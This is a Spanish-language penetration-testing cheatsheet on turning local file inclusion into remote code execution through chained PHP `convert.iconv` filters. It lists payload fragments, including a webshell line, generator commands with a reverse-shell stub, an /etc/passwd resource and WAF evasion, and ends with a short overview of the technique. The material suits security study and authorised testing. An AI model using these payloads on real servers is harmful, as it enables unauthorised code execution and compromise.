---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
---
# LFI To RCE - PHP Filter Chains 

***

## Cheatsheet

| **Técnica**                             | **Descripción**                                                                                          | **Payload**                                                                              |
| --------------------------------------- | -------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
| <br>Filter chain básico                 | <br>Encadenar múltiples filtros `convert.iconv` para generar caracteres arbitrarios<br><br>              | <br>`php://filter/convert.iconv.UTF8.CSISO2022KR/...`                                    |
| <br><br>Generación de webshell          | <br>Construir `<?php system($_GET['cmd']); ?>` carácter por carácter mediante cadenas de filtros<br><br> | <br><br>Chain completa generada con herramienta automatizada                             |
| <br>php_filter_chain_generator.py       | <br>Usar la herramienta de Synacktiv para generar la cadena automáticamente<br><br>                      | <br>`python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'`             |
| <br>Base64 encode + decode en cadena    | <br>Usar filtros base64 intermedios para limpiar basura generada entre conversiones<br><br>              | <br>`convert.base64-encode\|convert.base64-decode` intercalados                          |
| <br>Iconv charset chaining              | <br>Combinar distintos charsets para producir los bytes exactos del payload<br><br>                      | <br>Cadenas de `convert.iconv.X.Y` donde X e Y son charsets específicos                  |
| <br>Filter chain + include              | <br>Inyectar código sin subir archivos ni envenenar logs<br><br>                                         | <br>LFI: `php://filter/[cadena_de_filtros]/resource=php://temp`                          |
| <br>Filter chain con resource existente | <br>Usar un archivo existente del servidor como base para la cadena<br><br>                              | <br>`php://filter/[cadena]/resource=/etc/passwd`                                         |
| <br>Filter chain + reverse shell        | <br>Generar una reverse shell completa mediante filter chains<br><br>                                    | <br>`python3 php_filter_chain_generator.py --chain '<?php exec("/bin/bash -c ..."); ?>'` |
| <br>Filter chain con WAF bypass         | <br>Generar el payload encodeado para evadir detección de WAF<br><br>                                    | <br>Payload resultante no contiene strings sospechosas legibles                          |
| <br>Filter chain con file_get_contents  | <br>Funciona también cuando la función vulnerable es `file_get_contents` en vez de `include`<br><br>     | <br>Mismo payload, distinta función vulnerable                                           |



***

## Overview

PHP Filter Chains es una técnica descubierta por el equipo de Synacktiv que permite lograr RCE desde un LFI sin necesidad de subir archivos, envenenar logs, ni depender de ningún recurso externo. Funciona encadenando decenas o cientos de filtros `convert.iconv` dentro de `php://filter`, donde cada conversión entre charsets genera bytes específicos que, al acumularse, forman el payload PHP deseado. Es extremadamente potente porque solo requiere la función `include()` vulnerable y nada más, pero la complejidad de construir las cadenas manualmente es enorme, por eso se usa casi siempre con la herramienta `php_filter_chain_generator.py`. Es considerada una de las técnicas más elegantes y avanzadas de explotación de LFI.


***

## Notas Relacionadas


***
